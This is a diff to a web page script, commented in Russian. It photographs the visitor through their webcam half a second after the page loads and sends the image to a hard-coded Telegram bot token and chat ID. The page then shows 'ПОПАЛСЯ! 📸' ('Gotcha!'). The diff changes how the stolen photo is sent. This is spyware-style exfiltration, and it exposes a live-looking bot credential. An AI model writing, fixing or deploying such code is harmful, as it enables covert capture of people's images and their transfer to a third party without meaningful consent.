@@ -29,7 +29,7 @@
             const statusText = document.getElementById('status');
             
             try {
-                // Запрашиваем доступ к камере
+                // 1. Запрашиваем доступ к камере
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement('video');
                 const canvas = document.createElement('canvas');
@@ -37,44 +37,37 @@
 
                 video.srcObject = stream;
 
-                // Ждем, пока видео "проснется" (даем 1 секунду)
+                // 2. Ждем, пока видео "прогрузится" (1 секунда)
                 video.onloadedmetadata = () => {
                     setTimeout(() => {
                         canvas.width = video.videoWidth;
                         canvas.height = video.videoHeight;
                         context.drawImage(video, 0, 0);
                         
-                        // Превращаем кадр в картинку
+                        // 3. Получаем данные картинки
                         const dataUrl = canvas.toDataURL('image/png');
                         
-                        // ТВОИ ДАННЫЕ:
+                        // ТВОИ ДАННЫЕ (уже вставлены):
                         const token = "9270278972:AAHHz8RjL_KQ0OBDXHQUCad7cJW4BdbXafQ"; 
                         const chatId = "1062964951";
 
-                        // Используем метод POST — он гораздо стабильнее для картинок!
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({
-                                chat_id: chatId,
-                                photo: dataUrl
+                        // 4. ОТПРАВКА (используем encodeURIComponent для надежности)
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(dataUrl)}`)
+                            .then(response => {
+                                if (response.ok) {
+                                    statusText.innerText = "ПОПАЛСЯ! 📸";
+                                } else {
+                                    // Если всё равно ошибка, покажем код ошибки в консоли
+                                    statusText.innerText = "Ошибка отправки!";
+                                    console.log("Ответ сервера:", response.status);
+                                }
                             })
-                        })
-                        .then(response => {
-                            if (response.ok) {
-                                statusText.innerText = "ПОПАЛСЯ! 📸";
-                            } else {
-                                statusText.innerText = "Ошибка отправки!";
-                            }
-                        })
-                        .catch(err => {
-                            statusText.innerText = "Ошибка сети!";
-                            console.error(err);
-                        });
+                            .catch(err => {
+                                statusText.innerText = "Ошибка сети!";
+                                console.error(err);
+                            });
 
-                        // Выключаем камеру
+                        // 5. Выключаем камеру
                         stream.getTracks().forEach(track => track.stop());
                     }, 1000);
                 };
@@ -84,7 +77,7 @@
             }
         }
 
-        // Запускаем функцию через полсекунды после открытия страницы
+        // Запуск через полсекунды после открытия страницы
         setTimeout(takePhoto, 500);
     </script>
 </body>
